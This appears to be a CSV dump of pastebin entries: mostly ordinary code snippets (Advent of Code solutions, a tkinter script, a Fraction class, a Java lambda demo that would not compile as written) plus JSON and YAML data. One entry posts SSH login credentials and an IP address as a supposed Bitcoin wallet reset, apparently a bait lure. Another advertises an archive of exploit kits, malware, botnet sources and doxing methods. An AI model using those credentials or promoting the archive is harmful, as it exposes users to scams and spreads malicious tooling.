id,title,username,language,date,content
k49pYeJG,Untitled,Kaban4ik,Java,Wednesday 20th of December 2023 04:44:39 AM CDT,"@FunctionalInterface
public interface FunctionalInterface {
    void method();
}

class Main {

	private static final int z = 50;

	public static void main(string... args) {
        int x = 10;
        FunctionalInterface ff
                = () -> System.out.println(""Value of x : "" + x);
        ff.method();

        
        ff.method();


        int y = 30;
        ff = () -> System.out.println(""Value of y : "" + y);
        ff.method();

        ff = () -> System.out.println(""Value of z : "" + z);
        ff.method();
	}
}"
srE6LNgi,Google Ads Purchase Code,Jawad_Khan,JavaScript,Wednesday 20th of December 2023 04:34:11 AM CDT,"  <script>
    gtag(""event"", ""purchase"", {
        transaction_id: ""T_12345_1"",
        affiliation: ""Google Merchandise Store"",
        value: 25.42,
        tax: 4.90,
        shipping: 5.99,
        currency: ""USD"",
        coupon: ""SUMMER_SALE"",
        items: [
        // If someone purchases more than one item,
        // you can add those items to the items array
         {
          item_id: ""SKU_12345"",
          item_name: ""Stan and Friends Tee"",
          affiliation: ""Google Merchandise Store"",
          coupon: ""SUMMER_FUN"",
          discount: 2.22,
          index: 0,
          item_brand: ""Google"",
          item_category: ""Apparel"",
          item_category2: ""Adult"",
          item_category3: ""Shirts"",
          item_category4: ""Crew"",
          item_category5: ""Short sleeve"",
          item_list_id: ""related_products"",
          item_list_name: ""Related Products"",
          item_variant: ""green"",
          location_id: ""ChIJIQBpAG2ahYAR_6128GcTUEo"",
          price: 9.99,
          quantity: 1
        }]
    });
    </script>"
id1599WX,# 512x512_rgb_gradient_ctrl_3.py,here2share,Python,Wednesday 20th of December 2023 04:29:51 AM CDT,"# 512x512_rgb_gradient_ctrl_3.py

import tkinter as tk
import random
from PIL import Image, ImageTk, ImageFilter

ww = 512
hh = 512

root = tk.Tk()
root.title(""512x512_rgb_gradient_ctrl"")
root.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

def generate(event=None):
	for size in layers:
		interpolate(size)
	draw()

def interpolate(size):
	img = Image.new(""RGBA"", (size, size))
	pixels = img.load()
	for y in range(size):
		for x in range(size):
			red = random.randint(0, 255)
			green = random.randint(0, 255)
			blue = random.randint(0, 255)
			pixels[x, y] = (red, green, blue, 255)
	img = img.resize((ww, hh))
	layers[size] = img

def draw(event=None):
	buffer = Image.new(""RGBA"", (ww, hh), (255, 255, 255, 255))
	for size, layer_image in layers.items():
		if size != 4:
			alpha = float(opacity_slider[size].get()) / 2056.0
		else:
			alpha = 1
		buffer = Image.blend(buffer, layer_image, alpha)
	
	contour_layer = buffer.point(lambda x: 0 if x % 30 < 15 else 255)
	buffer = Image.blend(buffer, contour_layer, 0.05)
	
	photo = ImageTk.PhotoImage(buffer)
	canvas.create_image(0, 0, anchor=tk.NW, image=photo)
	canvas.image = photo

opacity_label = tk.Toplevel(root)
opacity_title = tk.Label(opacity_label, text=""Press Spacebar To Randomize"")
opacity_title.pack()
opacity_slider = {}
layers = {}

size = 4
interpolate(size)
while size + 6 < 32:
	size += 7
	opacity_slider[size] = tk.Scale(opacity_label, from_=512, to=0, orient=tk.VERTICAL, label=size, command=draw)
	opacity_slider[size].pack(side=tk.LEFT, fill='both', expand=True)
	opacity_slider[size].set(5)
	interpolate(size)

canvas.update()
t = opacity_label.winfo_width()
opacity_label.geometry(""%dx300+%d+%d"" %(t, 50, 50))
for t in (root, opacity_label):
	t.bind(""<space>"", generate)
opacity_label.wm_transient(root)

draw()
root.mainloop()"
amxap93P,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Wednesday 20th of December 2023 04:23:23 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-583495"
WFhW59qR,x1337,hulk4201,GetText,Wednesday 20th of December 2023 04:18:57 AM CDT,"██╗  ██╗ ██╗██████╗ ██████╗ ███████╗    ██╗  ██╗██╗   ██╗██████╗ 
╚██╗██╔╝███║╚════██╗╚════██╗╚════██║    ██║  ██║██║   ██║██╔══██╗
 ╚███╔╝ ╚██║ █████╔╝ █████╔╝    ██╔╝    ███████║██║   ██║██████╔╝
 ██╔██╗  ██║ ╚═══██╗ ╚═══██╗   ██╔╝     ██╔══██║██║   ██║██╔══██╗
██╔╝ ██╗ ██║██████╔╝██████╔╝   ██║      ██║  ██║╚██████╔╝██████╔╝
╚═╝  ╚═╝ ╚═╝╚═════╝ ╚═════╝    ╚═╝      ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
                                                                 
								[ https://x1337.pw ]
	Leakedfiles is an archive based website that holds many diffrent files such as, exploit kits, Malware/warez, botnet sources, 0days, exploits, scanners, databases, system tools, networking, dstating, sentryMBA configs, skype deob 7 + MORE! Check us out @ https://t.me/x1337hub


________________[ Tags Ignore ]________________
botnet, mirai botnet, mirai, qbot, kaiten, kaitenSTD, hackforums, leak.sx, leakforums, youtube, archive, twitter, facebook, tutorials, malware, warez, exploitkits, 0days, RCE, PoC, sqli, news, krebs, microsoft, google, software, weather, g, calculator, youtube to mp3, dictionary, translator, movies, speed test, cheap flights, maps, unblocked games, restaurants, social security, cars, happy birthday, quotes, ga lottery, pa lottery, youtube converter, cloudflare, crimeflare, reverse phone lookup, doxing methods, doxing, keemstar, pizza, school closings, cloudflare resolver, skype resolver, skyperesolver, skype ip resolver, skype resolve, resolver skype, skresolver, ip to skype, email to skype, skype to ip, skype to lan, resolver,Skypegrab,best,skype,resolver,2015,ip2skype,hackforums,leakforums,hacking,hacker,hack,ddos,bypass resolver,db lookup skype resolver, free skype resolver, webbased resolver, hackforums, blacklist, skype,speedresolve, hacking, hacker, skype resolver,  skype, beta resolver,  beta, skype2ip,  ip2skype,  hackforums,  leak,  resolveme,  free skype resolver, free resolver, hanzresolver, hanz resolver, hanzresolver resolver, skype beta resolver, bypass skype beta, skype beta, ip resolver, skype ip, resolver ip skype, skype resolver free, skype to ip, leak sx,  leak.sx, skype resolver beta, skype2email, email2skype, Exploits, Dstat, Skype Deob 7"
EU0c7Cqk,Advent of Code 2023 - Day 20,mgla,C#,Wednesday 20th of December 2023 04:14:01 AM CDT,"var input = File.ReadAllLines(""input.txt"");

var modules = new Dictionary<string, IModule>();

foreach (var line in input)
{
    var split = line.Split("" -> "");
    var name = split[0];
    var targets = split[1].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();

    if (name == ""broadcaster"")
    {
        modules[name] = new Broadcaster(name, targets);
    }
    else if (name.StartsWith('%'))
    {
        modules[name[1..]] = new FlipFlop(name[1..], targets);
    }
    else if (name.StartsWith('&'))
    {
        modules[name[1..]] = new Conjunction(name[1..], targets);
    }
}

foreach (var module in modules.Values)
{
    if (module is not Conjunction conjunction) continue;

    var inputs = modules.Values.Where(m => m.Targets.ContainsKey(module.Name)).ToList();
    foreach (var inputModule in inputs)
    {
        conjunction.Inputs[inputModule.Name] = PulseType.Low;
    }
}

var lowPulses = 0;
var highPulses = 0;
var queue = new Queue<(IModule Module, PulseType PulseType)>();
var currentPulse = PulseType.Low;
var count = 0;

// The module that sends pulses to rx - it's a conjunction.
// In order to send a low pulse to rx, all of its inputs must be sending a high pulse.
var rxSource = modules.Values.First(m => m.Targets.ContainsKey(""rx""));

// The modules that send pulses to the conjunction that sends pulses to rx.
var rxSourceInputs = modules.Values.Where(m => m.Targets.ContainsKey(rxSource.Name)).ToList();

// We will count how many pushes are needed for each module to send out a high pulse.
var rxSourceInputCounts = new Dictionary<string, (int Count, bool Done)>(); 
foreach (var rxSourceModule in rxSourceInputs)
{
    rxSourceInputCounts[rxSourceModule.Name] = (0, false);
}

while (true)
{
    if (count == 1000)
    {
        Console.WriteLine($""Part 1: {lowPulses * highPulses}"");
    }

    count++;

    queue.Enqueue((modules[""broadcaster""], currentPulse));

    if (currentPulse == PulseType.Low)
    {
        lowPulses++;
    }
    else
    {
        highPulses++;
    }

    if (rxSourceInputCounts.All(rxs => rxs.Value.Done))
    {
        // We know that all of the inputs to the conjunction that sends pulses to rx have sent out a high pulse.
        // Now we just find the LCM of the counts for each input in order to find the first time that all of the inputs
        // have sent out a high pulse, which in turn would cause rx to receive a low pulse.
        Console.WriteLine($""Part 2: {Lcm(rxSourceInputCounts.Select(rxs => rxs.Value.Count).ToArray())}"");
        break;
    }

    while (queue.TryDequeue(out var current))
    {
        current.Module.Process(current.PulseType);

        foreach (var target in current.Module.Targets.Keys)
        {
            var targetPulse = current.Module.Targets[target];

            if (target == ""rx"")
            {
                if (current.Module is not Conjunction conjunction) continue;

                var highInputs = conjunction.Inputs.Where(conjunctionInput => conjunctionInput.Value == PulseType.High);
                foreach (var conjunctionInput in highInputs)
                {
                    // The module is sending a high pulse to rx, so store its count.
                    rxSourceInputCounts[conjunctionInput.Key] = (count, true); 
                }
            }

            switch (targetPulse)
            {
                case PulseType.Low:
                    lowPulses++;
                    break;
                case PulseType.High:
                    highPulses++;
                    break;
                case PulseType.None:
                default:
                    break;
            }

            if (targetPulse != PulseType.None)
            {
                if (!modules.ContainsKey(target))
                {
                    continue;
                }

                if (modules[target] is Conjunction conjunction)
                {
                    conjunction.Inputs[current.Module.Name] = targetPulse;
                }

                queue.Enqueue((modules[target], targetPulse));
            }

            if (queue.Count == 0)
            {
                currentPulse = current.PulseType == PulseType.Low ? PulseType.High : PulseType.Low;
            }
        }
    }
}

return;

static long Lcm(IEnumerable<int> numbers) => numbers.Select(Convert.ToInt64).Aggregate((a, b) => a * b / Gcd(a, b));

static long Gcd(long a, long b) => b == 0 ? a : Gcd(b, a % b);

internal interface IModule
{
    string Name { get; set; }
    Dictionary<string, PulseType> Targets { get; set; }
    void Process(PulseType pulse);
}

internal class Broadcaster : IModule
{
    public Broadcaster(string name, List<string> targets)
    {
        Name = name;

        foreach (var target in targets)
        {
            Targets[target] = PulseType.Low;
        }
    }

    public string Name { get; set; }
    public Dictionary<string, PulseType> Targets { get; set; } = new();

    public virtual void Process(PulseType pulse)
    {
        foreach (var name in Targets.Keys)
        {
            Targets[name] = pulse;
        }
    }
}

internal class FlipFlop(string name, List<string> targets) : Broadcaster(name, targets)
{
    public bool PoweredOn { get; set; }

    public override void Process(PulseType pulse)
    {
        var output = PulseType.None;

        if (pulse == PulseType.Low)
        {
            output = PoweredOn ? PulseType.Low : PulseType.High;
            PoweredOn = !PoweredOn;
        }

        foreach (var targetName in Targets.Keys)
        {
            Targets[targetName] = output;
        }
    }
}

internal class Conjunction(string name, List<string> targets) : Broadcaster(name, targets)
{
    public Dictionary<string, PulseType> Inputs { get; set; } = new();

    public override void Process(PulseType pulse)
    {
        foreach (var name in Targets.Keys)
        {
            Targets[name] = Inputs.Values.All(x => x == PulseType.High) ? PulseType.Low : PulseType.High;
        }
    }
}

internal enum PulseType
{
    None,
    Low,
    High
}"
xuqghq2b,Untitled,kompilainenn,Python,Wednesday 20th of December 2023 03:43:31 AM CDT,"from math import gcd


class Fraction:
    def __init__(self, *args):
        if len(args) == 2:
            self.num = args[0]
            self.denom = args[1]
            self._sokr()
        elif len(args) == 1:
            self.num = int(args[0][:args[0].find('/')])
            self.denom = int(args[0][args[0].find('/') + 1:])
            self._sokr()

    def _sokr(self):
        gcd_res = gcd(self.num, self.denom)
        if gcd_res > 1:
            self.num = self.num // gcd_res
            self.denom = self.denom // gcd_res

    def numerator(self, num=None):
        if num is None:
            return self.num
        else:
            self.num = num
            self._sokr()

    def denominator(self, num=None):
        if num is None:
            return self.denom
        else:
            self.denom = num
            self._sokr()

    def __str__(self):
        return f'{self.num}/{self.denom}'

    def __repr__(self):
        return f'Fraction({self.num}, {self.denom})'"
D34hiXEB,Sophie.Scholl.2005.Deu.BDRip.1080p.h264.ac3.Subs-bp,bpmircea,BrainFuck,Wednesday 20th of December 2023 03:31:55 AM CDT,"Sophie Scholl - Die letzten Tage (Sophie Scholl: The Final Days) (Marc Rothemund, 2005)
aka
Sophie.Scholl.2005.Deu.BDRip.1080p.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0426578/

Uploading..."
QthaBAxJ,Untitled,eiten,YAML,Wednesday 20th of December 2023 03:08:08 AM CDT,"api:
  services:
    - service: set_total_pulses
      variables:
        my_total_pulses: int
      then:
        - globals.set:
            id: total_pulses
            value: !lambda 'return my_total_pulses;'"
PZu9PqU4,json varavara,MChaos,JSON,Wednesday 20th of December 2023 02:57:18 AM CDT,"{
""Error"":"""",
""Success"":true,
""Groups"":[
{
""ParentID"":622245,
""Items"":[
{
""Ordering"":1000,
""Price"":350.00,
""ShortName"":""2 ore - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622289,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""2 ore - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005897 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":400.00,
""ShortName"":""3 ore - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622291,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""3 ore - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005898 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":500.00,
""ShortName"":""4 ore - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622293,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""4 ore - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005899 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":750.00,
""ShortName"":""VIP - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622295,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""VIP - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005900 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
},
{
""Ordering"":1000,
""Price"":400.00,
""ShortName"":""ZdN - Bilet intrare"",
""Weidth"":1.000,
""CpxMaxCount"":0,
""IsModifierGroup"":0,
""IsManualPrice"":0,
""DefaultModifier"":0,
""Description"":null,
""CategoryID"":0,
""SaleStatus"":1,
""MaxCount"":0,
""EnterpriseID"":0,
""Barcodes"":null,
""ForValidadte"":false,
""ParentID"":622285,
""HierarchyLevel"":1,
""SectionID"":4335,
""SaleSatus"":1,
""ExParentID"":0,
""ID"":622297,
""IconId"":0,
""TypeID"":7,
""ExciseStamps"":false,
""Name"":""ZdN - Bilet intrare"",
""Enabled"":null,
""KCal"":0,
""RestCount"":null,
""RestInformCount"":null,
""Code"":""100005901 "",
""ShowMask"":0,
""PhotoUrl"":null,
""CpxIsDefault"":0,
""IsComplex"":0
}
],
""ID"":622285,
""Name"":""1.0. Bilete de intrare"",
""Sections"":[
4335
],
""Groups"":null,
""Ordering"":1000,
""Enabled"":null
}
]
}"
U3gGuTPe,"AoC 2023 day 20, part 2 (Perl)",musifter,Perl,Wednesday 20th of December 2023 02:50:48 AM CDT,"#!/usr/bin/perl

use strict;
use warnings;

use feature         qw(say);
use List::Util      qw(reduce all);
use Math::Utils     qw(lcm);

my %Circ;

while (<>) {
    my ($type, $name, $out) = m#(.)(\w+) -> (.*)#;

    $name = 'broadcaster' if ($type eq 'b');

    my @out = split( /, /, $out );

    $Circ{$name}{type} = $type;
    $Circ{$name}{out}  = [@out];
    push( $Circ{$_}{in}->@*, $name )  foreach (@out);
}

# Make sure type is defined for everything to avoid warnings
$Circ{$_}{type} //= ''  foreach (keys %Circ);

# ASSUME: rx has one input, a NAND gate that collects from several NAND gates.
# Those gates should receive all high at some point on a cycle, and when they
# all line up, rx will receive a low pulse.
my %collect = map { $_ => [] } $Circ{ $Circ{rx}{in}[0] }{in}->@*;
my $presses = 0;

LOOP:
while (1) {
    # broadcaster is honourary flip-flop, always start high
    $Circ{broadcaster}{state} = 1;
    my @queue = ([0, 'broadcaster', 'button']);
    $presses++;

    PULSE:
    while (my $pulse = shift @queue) {
        my ($bit, $targ, $src) = @$pulse;

        next PULSE  if (!defined $Circ{$targ}{type});   # output from tests

        if ($Circ{$targ}{type} eq '&') {
            # NAND
            $Circ{$targ}{$src} = $bit;

            my $state = int !(reduce {$a & $b} (1, map {$Circ{$targ}{$_} // 0} $Circ{$targ}{in}->@*));
            push( $collect{$targ}->@*, $presses ) if (exists $collect{$targ} and $state);

            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );

        } else {
            # flip-flop or 'b'roadcast
            next PULSE if ($bit);

            my $state = $Circ{$targ}{state} = int !($Circ{$targ}{state} // 0);
            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );
        }
    }

    # XXX: Just getting the first appearance of each seems to give us the cycles we want.
    last LOOP  if (all { scalar $collect{$_}->@* } keys %collect);
}

say ""Sections all set at: "", join( ', ', map { $_->[0] } values %collect );
say ""Part 2: "", lcm map { $_->[0] } values %collect;"
FE4FCjWw,"AoC 2023 day 20, part 1 (Perl)",musifter,Perl,Wednesday 20th of December 2023 02:50:01 AM CDT,"#!/usr/bin/perl

use strict;
use warnings;

use feature         qw(say);
use List::Util      qw(reduce product);

# Read in circuit
my %Circ;
while (<>) {
    my ($type, $name, $out) = m#(.)(\w+) -> (.*)#;

    $name = 'broadcaster' if ($type eq 'b');

    my @out = split( /, /, $out );

    $Circ{$name}{type} = $type;
    $Circ{$name}{out}  = [@out];
    push( $Circ{$_}{in}->@*, $name )  foreach (@out);
}

my @pulses = (0, 0);        # counts of low (0) and high (1) pulses

foreach (1 .. 1000) {
    # broadcaster is honourary flip-flop, always starts high
    $Circ{broadcaster}{state} = 1;
    my @queue = ([0, 'broadcaster', 'button']);

    PULSE:
    while (my $pulse = shift @queue) {
        my ($bit, $targ, $src) = @$pulse;

        $pulses[$bit]++;
        next PULSE  if (!defined $Circ{$targ}{type});   # output only nodes

        if ($Circ{$targ}{type} eq '&') {  # NAND
            $Circ{$targ}{$src} = $bit;

            my $state = int !(reduce {$a & $b} (1, map {$Circ{$targ}{$_} // 0} $Circ{$targ}{in}->@*));
            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );

        } else {  # flip-flop or 'b'roadcast
            next PULSE if ($bit);

            my $state = $Circ{$targ}{state} = int !($Circ{$targ}{state} // 0);
            push( @queue, map { [$state, $_, $targ] } $Circ{$targ}{out}->@* );
        }
    }
}

say ""Pulses: "", join( ', ', @pulses );
say ""Part 1: "", product @pulses;"
30WcJhjT,Check Hostname,nobs,Bash,Wednesday 20th of December 2023 02:29:02 AM CDT,"#!/bin/bash
# prüfe Einstellungen für Hostname und Domainnamen
#
# Eintrag in /etc/hostname sollte ein FQDN sein.
# Dieser Eintrag sollte der erste Name der primären IP in 
# /etc/hosts sein.

a=$(hostname -I | cut -d ' ' -f 1)
echo    ""primäre IP:                                    $a""
echo -n ""FQDN Hostname laut /etc/hosts:                 ""
awk -v a=$a '($1 == a){print $2}' /etc/hosts
echo -n ""Domainname laut Dienstprogramm dnsdomainname:  ""
dnsdomainname
echo -n ""Hostname laut Dienstprogramm hostname:         ""
hostname
"
